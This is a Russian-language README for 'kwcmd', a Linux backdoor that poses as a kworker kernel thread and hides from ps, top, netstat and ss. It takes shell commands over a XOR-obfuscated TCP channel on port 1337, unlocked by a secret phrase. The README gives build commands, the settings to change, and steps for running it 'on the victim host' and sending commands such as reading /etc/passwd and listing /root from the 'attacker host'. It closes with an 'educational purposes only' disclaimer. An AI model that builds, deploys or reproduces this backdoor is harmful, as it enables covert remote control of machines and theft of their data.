# 👻 kwcmd

**kwcmd** — это скрытый linux backdoor, маскирующийся под системный процесс `kworker`, уклоняемся от top/htop/ps/netstat/ss, замыливаем /proc/self/comm и /proc/self/cmdline слушающий TCP-порт и исполняющий команды, переданные по зашифрованному XOR каналу.
---
### 🛠️ Автор: [reeves0x0]  For TG channel https://t.me/proxy_bar 
---

## ⚙️ Возможности

- 🥷 Маскировка под `[kworker/u8:7]`
  - Изменение имени процесса (`argv[0]`, `/proc/self/comm`, `prctl`)
  - Очистка аргументов и переменных окружения
- 👻 Демонизация (двойной `fork`, `setsid`, `umask(0)`)
- 📡 TCP-сервер на порту `1337`
- 🔐 XOR-шифрование (`myxor`) + секрет-фраза (`sesame:street`)
- 🧨 Выполнение произвольных shell-команд через `popen`
- 📤 Ответ клиенту с выводом stdout

---

## 📡 Как это работает
Сначала от клиента к серверу посылается секрет-фраза (`define SECRET "sesame:street"`) если фраза верна - устанавливается канал для передачи payloads в XOR виде (`#define XOR_KEY "myxor"`) 

---

## 🧪 Настройка и Сборка (не забудь установить зависимости под свой дистрибутив)
В файлах:
- kwcmd.c  - заменить директивы на свои:
  - #define PORT 1337
  - #define SECRET "sesame:street"
  - #define XOR_KEY "myxor"

- client-attacker.sh
  - KEY="myxor"
  - SECRET="sesame:street"
  - nc 10.101.1.15 1337

```bash
gcc kwcmd.c -o kwcmd
OR
gcc -static -no-pie -o kwcmd kwcmd.c
``` 
---

## 🧨🧨🧨 Lets GO
На хосте жертвы
```bash
./kwcmd
```

На хосте атакующего
```bash
chmod +x client-attacker.sh
client-attacker.sh "date && ls -llah /root"
OR
client-attacker.sh "cat /etc/passwd"
```

![изображение](https://github.com/user-attachments/assets/1265a1d6-8523-4f39-8090-3a5612e714ed)
---

⚠️ Предупреждение

    Этот проект предоставляется только в образовательных целях. Автор не несёт ответственности за последствия использования в боевых условиях. 
